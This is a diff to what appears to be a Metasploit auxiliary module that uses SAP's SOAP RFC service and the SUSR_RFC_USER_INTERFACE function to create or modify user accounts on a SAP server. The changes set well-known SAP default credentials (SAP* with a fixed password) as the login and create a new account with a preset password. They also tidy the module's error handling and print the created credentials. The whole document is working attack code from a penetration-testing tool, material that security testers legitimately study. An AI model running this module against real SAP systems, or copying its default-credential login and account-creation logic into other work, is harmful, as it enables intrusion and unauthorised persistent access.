@@ -25,21 +25,30 @@ class Metasploit4 < Msf::Auxiliary
 
 	def initialize
 		super(
-			'Name' => 'SAP SOAP RFC SUSR_RFC_USER_INTERFACE',
+			'Name' => 'SAP /sap/bc/soap/rfc SOAP Service SUSR_RFC_USER_INTERFACE Function User Creation',
 			'Description' => %q{
-				This module calls the RFC module (via SOAP) SUSR_RFC_USER_INTERFACE.
-				The module can be used for creating/modifying users.
-				},
-			'References' => [[ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]],
-			'Author' => ['Agnivesh Sathasivam','nmonkee'],
-			'License' => BSD_LICENSE
+					This module makes use of the SUSR_RFC_USER_INTERFACE function, through the SOAP
+				/sap/bc/soap/rfc service, for creating/modifying users on a SAP.
+			},
+			'References' =>
+				[
+					[ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]
+				],
+			'Author' =>
+				[
+					'Agnivesh Sathasivam',
+					'nmonkee'
+				],
+			'License' => MSF_LICENSE
 			)
-		register_options([
-			OptString.new('CLIENT', [true, 'SAP client', nil]),
-			OptString.new('USERNAME', [true, 'Username', nil]),
-			OptString.new('PASSWORD', [true, 'Password', nil]),
-			OptString.new('ABAP_PASSWORD',[false,'Password for the account (Default is 06071992)','06071992']),
-			OptString.new('ABAP_USER',[false,'Username for the account (Username in upper case only. Default is ADMIN)', 'ADMIN'])
+		register_options(
+			[
+				Opt::RPORT(8000),
+				OptString.new('CLIENT', [true, 'SAP client', '001']),
+				OptString.new('USERNAME', [true, 'Username', 'SAP*']),
+				OptString.new('PASSWORD', [true, 'Password', '06071992']),
+				OptString.new('ABAP_PASSWORD',[false,'Password for the account (Default is msf1234)','msf1234']),
+				OptString.new('ABAP_USER',[false,'Username for the account (Username in upper case only. Default is MSF)', 'MSF'])
 			], self.class)
 	end
 
@@ -73,20 +82,25 @@ class Metasploit4 < Msf::Auxiliary
 					'Authorization' => 'Basic ' + user_pass,
 					'Content-Type' => 'text/xml; charset=UTF-8'}
 					}, 45)
-			if res and res.code = 200
-				if res.body =~ /<h1>Logon failed<\/h1>/
-					print_error("[SAP] #{ip}:#{rport} - Logon failed")
-				elsif res.body =~ /faultstring/
-					error = []
-					error = [ res.body.scan(%r{(.*?)})) ]
-					print_error("[SAP] #{ip}:#{rport} - #{error.join.chomp}")
+				if res and res.code == 200
+					if res.body =~ /<h1>Logon failed<\/h1>/
+						print_error("[SAP] #{ip}:#{rport} - Logon failed")
+						return
+					elsif res.body =~ /faultstring/
+						error = []
+						error = [ res.body.scan(%r{(.*?)}) ]
+						print_error("[SAP] #{ip}:#{rport} - #{error.join.chomp}")
+						return
+					else
+						print_good("[SAP] #{ip}:#{rport} - User '#{datastore['ABAP_USER']}' with password '#{datastore['ABAP_PASSWORD']}' created")
+						return
+					end
 				else
-					print_good("[SAP] #{ip}:#{rport} - User '#{datastore['ABAP_USER']}' with password '#{datastore['ABAP_PASSWORD']}' created")
+					print_error("[SAP] #{ip}:#{rport} - Unknown error")
+					print_error("[SAP] #{ip}:#{rport} - Error code: " + res.code) if res
+					print_error("[SAP] #{ip}:#{rport} - Error message: " + res.message) if res
+					return
 				end
-			else
-				print_error("[SAP] #{ip}:#{rport} - Error code: " + res.code) if res
-				print_error("[SAP] #{ip}:#{rport} - Error message: " + res.message) if res
-			end
 			rescue ::Rex::ConnectionError
 				print_error("[SAP] #{rhost}:#{rport} - Unable to connect")
 				return
